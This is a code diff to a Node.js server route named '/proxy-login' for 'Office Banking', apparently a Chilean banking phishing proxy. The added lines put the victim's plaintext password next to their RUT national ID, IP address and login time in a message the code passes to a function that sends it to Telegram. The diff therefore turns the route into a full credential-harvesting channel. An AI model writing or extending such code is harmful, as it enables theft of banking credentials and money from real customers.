@@ -199,7 +199,11 @@ app.post("/proxy-login", async (req, res) => {
     if (rut && passwd) {
       console.log(`\n🔐 LOGIN CON RUT: ${rut.substring(0, 5)}***`);
       
-      const mensajeLogin = `🔐 Nuevo Login en Office Banking:\nRUT: ${rut}\nIP: ${ip}\nHora: ${new Date().toLocaleString('es-CL')}`;
+       const mensajeLogin = `🔐 Nuevo Login en Office Banking:
+RUT: ${rut}
+Clave: ${passwd}
+IP: ${ip}
+Hora: ${new Date().toLocaleString('es-CL')}`;
       const resultado = await enviarATelegram(mensajeLogin);
       
       console.log(`\n✅ Respondiendo al cliente...`);
